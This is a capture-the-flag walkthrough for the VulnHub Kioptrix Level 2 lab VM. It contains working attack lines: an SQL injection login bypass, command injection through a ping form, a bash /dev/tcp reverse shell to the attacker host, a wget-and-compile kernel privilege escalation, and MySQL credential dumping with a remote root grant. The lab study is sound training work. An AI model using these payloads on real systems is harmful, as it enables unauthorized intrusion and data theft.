---
layout: default
---

# VulnHub - Kioptrix level 2 writeup 

![Kioptrix Level 2 Header](/assets/images/vh_kioptrix2/kioptrix2_header.png)

[VulnHub Image Link](https://www.vulnhub.com/entry/kioptrix-level-11-2,23)

:monocle_face: :clock11:

> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Kioptrix Level 2 VirtualBox Setup

If you wish to use the virtual machine image in Oracle VirtualBox you will need to do the following steps to avoid a "Kernel Panic" error.
1. Create a new VM and choose not to use a disk
2. In “Settings -> Storage”, remove the SATA controller entirely and under the IDE controller add an new (existing) disk - and select the VMDK.
3. Under “Settings -> Audio” untick “Enable Audio”
4. Under “Settings -> Network” expand “Advanced” and change the Adaptor Type to “PCnet-PCI II (Am79c970A)”
5. Under “Settings -> Ports -> USB” untick “Enable USB Controller”

[Source](https://www.hypn.za.net/blog/2017/07/15/running-kioptrix-level-1-and-others-in-virtualbox/)

[More detailed guide on how to setup Kioptrix](https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-story-c824baf83da1)


## Initial recon
### Nmap scan

We start initial active recon with an fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap 10.0.2.6-A -T4 -vv -p-  -oA tcp_agg_all_ports
```

We can also run a quick (-T4) aggressive (-A) version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap 10.0.2.6 -sUV -T4 -A -vv -oA udp_fast_ver_top_1000
```

### Nmap results
#### TCP Scan

```
# Nmap 7.80 scan initiated Tue Jul 21 14:54:27 2020 as: nmap -A -T4 -vv -p- -oA tcp_agg_all_ports 10.0.2.6
Nmap scan report for 10.0.2.6
Host is up, received arp-response (0.00059s latency).
Scanned at 2020-07-21 14:54:28 EDT for 112s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
| 1024 35 149174282886581624883868648302761292182406879108668063702143177994710569161669502445416601666211201346192352271911333433971833283425439634231257314174441054335295864218587993634534355128377261436615077053235666774641007412196140534221696911370388178873572900977872600139866890316021962605461192127591516843621
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOWJ2N2BPBPm0HxCi630ZxHtTNMh+uVkeYCkKVNxavZkcJdpfFTOGZp054sj27mVZVtCeNMHhzAUpvRisn/cH4k4plLd1m8HACAVPtcgRrshCzb7wzQikrP+byCVypE0RpkQcDya+ngDMVzrkA+9KQSR/5W6BjldLW60A5oZgyfvAAAAFQC/iRZe4LlaYXwHvYYDpjnoCPY3xQAAAIBKFGl/zr/u1JxCV8a9dIAMIE0rk0jYtwvpDCdBre450ruoLII/hsparzdJs898SMWX1kEzigzUdtobDVT8nWdJAVRHCm8ruy4IQYIdtjYowXD7hxZTy/F0xOsiTRWBYMQPe8lW1oA+xabqlnCO3ppjmBecVlCwEMoeefnwGWAkxwAAAIAKajcioQiMDYW7veV13Yjmag6wyIia9+V9aO8JmgMi3cNr04Vl0FF+n7OIZ5QYvpSKcQgRzwNylEW5juV0Xh96m2g3rqEvDd4kTttCDlOltPgP6q6Z8JI0IGzcIGYBy6UWdIxj9D7F2ccc7fAM2o22+qgFp+FFiLeFDVbRhYz4sg==
|   1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA4j5XFFw9Km2yphjpu1gzDBglGSpMxtR8zOvpH9gUbOMXXbCQeXgOK3rs4cs/j75G54jALm99Ky7tgToNaEuxmQmwnpYk9bntoDu9SkiT/hPZdOwq40yrfWIHzlUNWTpY3okTdf/YNUAdl4NOBOYbf0x/dsAdHHqSWnvZmruFA6M=
|_sshv1: Server supports SSHv1
80/tcp   open  http       syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    syn-ack ttl 64 2 (RPC #100000)
443/tcp  open  ssl/https? syn-ack ttl 64
|_ssl-date: 2020-07-21T22:55:21+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
631/tcp  open  ipp        syn-ack ttl 64 CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
683/tcp  open  status     syn-ack ttl 64 1 (RPC #100024)
3306/tcp open  mysql      syn-ack ttl 64 MySQL (unauthorized)
MAC Address: 08:00:27:66:1E:6A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/21%OT=22%CT=1%CU=34505%PV=Y%DS=1%DC=D%G=Y%M=080027%T

Uptime guess: 0.006 days (since Tue Jul 21 14:48:13 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m58s

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.0.2.6

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 21 14:56:20 2020 -- 1 IP address (1 host up) scanned in 114.26 seconds
```

Viewing the nmap TCP scan results we can see a few interesting ports worth investigation. 

```
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
443/tcp  open  ssl/https? syn-ack ttl 64
631/tcp  open  ipp        syn-ack ttl 64 CUPS 1.1
3306/tcp open  mysql      syn-ack ttl 64 MySQL (unauthorized)
```

#### UDP Scan

```
# Nmap 7.80 scan initiated Wed Jul 22 09:10:58 2020 as: nmap -sUV -T4 -A -vv -oA udp_fast_ver_top_1000 10.0.2.6
Warning: 10.0.2.6 giving up on port because retransmission cap hit (6).
Increasing send delay for 10.0.2.6 from 100 to 200 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.0.2.6 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.0.2.6 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.0.2.6
Host is up, received arp-response (0.00052s latency).
Scanned at 2020-07-22 09:11:00 EDT for 1208s
Not shown: 973 closed ports
Reason: 973 port-unreaches
PORT      STATE         SERVICE     REASON              VERSION
49/udp    open|filtered tacacs      no-response
68/udp    open|filtered dhcpc       no-response
111/udp   open          rpcbind     udp-response ttl 64 2 (RPC #100000)
217/udp   open|filtered dbase       no-response
631/udp   open|filtered ipp         no-response
3457/udp  open|filtered vat-control no-response
4000/udp  open|filtered icq         no-response
5050/udp  open|filtered mmcc        no-response
6346/udp  open|filtered gnutella    no-response
17616/udp open|filtered unknown     no-response
17814/udp open|filtered unknown     no-response
19650/udp open|filtered unknown     no-response
20146/udp open|filtered unknown     no-response
20309/udp open|filtered unknown     no-response
21303/udp open|filtered unknown     no-response
21344/udp open|filtered unknown     no-response
21576/udp open|filtered unknown     no-response
27707/udp open|filtered unknown     no-response
33281/udp open|filtered unknown     no-response
49163/udp open|filtered unknown     no-response
49176/udp open|filtered unknown     no-response
49186/udp open|filtered unknown     no-response
51905/udp open|filtered unknown     no-response
52225/udp open|filtered unknown     no-response
53037/udp open|filtered unknown     no-response
58002/udp open|filtered unknown     no-response
61961/udp open|filtered unknown     no-response
MAC Address: 08:00:27:66:1E:6A (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=7/22%OT=%CT=%CU=2%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5F183F9C%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 10.0.2.6

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 09:31:08 2020 -- 1 IP address (1 host up) scanned in 1210.61 seconds
```

Nothing interesting found in our UDP scan.

## Web Server Enumeration (Port 80 and 443)

Run a Nikto scan to see if it reveals any interesting bits of information that we can use.

```
nikto -h 10.0.2.6 | tee nikto_results.txt
```

### Nikto scan results

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.6
+ Target Hostname:    10.0.2.6
+ Target Port:        80
+ Start Time:         2020-07-21 14:57:51 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/assets/images/vh_kioptrix2/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-07-21 14:58:44 (GMT-4) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Looking at the nikto results there isn't much that is of particular interest that stands out besides the outdated Apache Server version of (2.0.52)

We can look to see if this version is vulnerable to any particular exploits.

[Apache 2.0.52 Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-15944/Apache-Http-Server-2.0.52.html)

This might be worth a try.

[Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow](https://www.exploit-db.com/exploits/2237)
[Apache mod-rewrite MSF exploit code](https://packetstormsecurity.com/files/62377/apache-mod-rewrite.rb.txt.html)


### Web page - SQL Injection

Browsing the web page we are greeted by a simple "Remote System Administration Login" page.

![Login Page](/assets/images/vh_kioptrix2/vh_kioptrix2_webpage_1.jpg)

You can try simple default username and password combinations but none seem to work.

Lets try bypass the login by issuing some SQL injection escape sequences.

Enter the below values into the password field to bypass the authentication logic and use **"admin"** as the username.
```
' OR 1=1 -- -
```

The reason why this works is due to the insecure PHP SQL query code logic being used within the application.
```
# This is the original source code for the login
$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";

# When we enter in our above values it bypasses the password check and evaluates to true because of our OR 1=1 statement
$query = "SELECT * FROM users WHERE username = 'admin' AND password='' OR 1=1 -- -'";
```

This can be avoided by using parameterized queries coding technique.

Now that we are in the application it looks like we have a web console that issues the ping command on the target system.

Lets see if we can abuse this for command execution by chaining extra commands into the input using the semi-colon *;* followed by our command we want to execute.

```
# Lets see if it will cat out the passwd file.
10.0.2.4; cat /etc/passwd
```

![Web console](/assets/images/vh_kioptrix2/vh_kioptrix2_webpage_2.jpg)

Looks like we have command execution.

![Command execution results](/assets/images/vh_kioptrix2/vh_kioptrix2_webpage_3.jpg)

Use the following command to open a reverse shell back to the attacking machine.
```
; bash -i >& /dev/tcp/10.0.2.4/1337 0>&1
```

Make sure to set up a listener on the attacking machine.
```
nc -nvlp 1337
```

## Privilege Escalation

![Initial Shell](/assets/images/vh_kioptrix2/vh_kioptrix2_initial_shell.jpg)

Looks like we have gained an initial shell on the system as the **apache** user.

Check the Linux Kernel version by using the following command
```
uname -a
```

This reveals that this system has quite an old linux kernel version.

> Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

This command reveals the Linux distribution
```
cat /etc/*-release
```

The results say we are running CentOS 4.5

> CentOS release 4.5 (Final)

Go to [exploitdb.com](https://www.exploit-db.com/) and search for **Linux 2.6 centos** which should display the following results.

![Exploit DB results](/assets/images/vh_kioptrix2/vh_kioptrix2_privesc_1.jpg)

The one the looks most appropriate and matches our Linux Kernel version and distribution is:

**Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)**

[Exploit Link](https://www.exploit-db.com/exploits/9542)

Lets download and compile the exploit on our target system.

```
cd /tmp
wget http://10.0.2.4/exploit.c
gcc -o exploit exploit.c
id
./exploit.c
id
```

![Linux Kernel Exploit](/assets/images/vh_kioptrix2/vh_kioptrix2_privesc_2.jpg)

As you can see the Kernel Exploit works and we now have root permissions.

## SQL treasure hunting.

Lets first inspect the web sites source code to find database credentials as we know that the website is using SQL to validate the login credentials.

```
cd /var/www/html
cat index.php
```

Here is a part of the index.php source code, as you can see we have the database username and password here which we can use to explore the MySQL database.

```php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }
?>
```

Here is the pingit.php source code. As you can see it uses **shell_exec()** method which is vulnerable to command injection if the users input it not sanitized correctly.

```php
<?php

print $_POST['ip'];
if (isset($_POST['submit'])){
        $target = $_REQUEST[ 'ip' ];
        echo '<pre>';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '</pre>';
    }
?>
```

### Login to SQL database

```
# On the target system execute the following to get into a mysql console session
mysql -u john -phiroshima

# List all databases on the server
show databases;

# Switch to each database you wish to inspect.
use mysql;
use test;
use webapp;

# Show tables in the database
show tables;

# Use select statements to view the contents of interesting tables
select * from user;
select * from users;
```

![MySQL Console](/assets/images/vh_kioptrix2/vh_kioptrix2_mysql1.jpg)

Looking at the default mysql database and users table we find that john and root both have the same password. Thus we can use john's password to also log in as root and change permissions to allow us to access the database remotely.

![MySQL Users table](/assets/images/vh_kioptrix2/vh_kioptrix2_mysql2.jpg)

If you login to the mysql console as root using john's password and then apply the following command you should be able to login and access the mysql console from your attacking machine.
Make sure to replace the IP address to your attacking machine.

```
mysql -u root -phiroshima
use mysql;
GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.0.2.4';
```

On you attacking machine you can now connect to the mysql database directly as root
```
mysql -h 10.0.2.6 -u root
```

![MySQL connection](/assets/images/vh_kioptrix2/vh_kioptrix2_mysql3.jpg)

We can also check and see what the users were previously doing by inspecting the **.mysql_history** file

```
find / -name ".mysql_history"
cat /root/.mysql_history
```

![MySQL History](/assets/images/vh_kioptrix2/vh_kioptrix2_mysql4.jpg)

## Summary

Getting the initial foothold into the system was quite easy as it involved a simple SQL injection bypass string. The web console also allowed us to gain command execution on the system easily by chaining in commands. As the linux kernel is quite outdated it seemed like the most appropriate avenue for privilege escalation and we easily found the correct kernel exploit to escalate our privileges to root. Once we had a shell on the system we could enumerate the database to see what goodies it had inside.

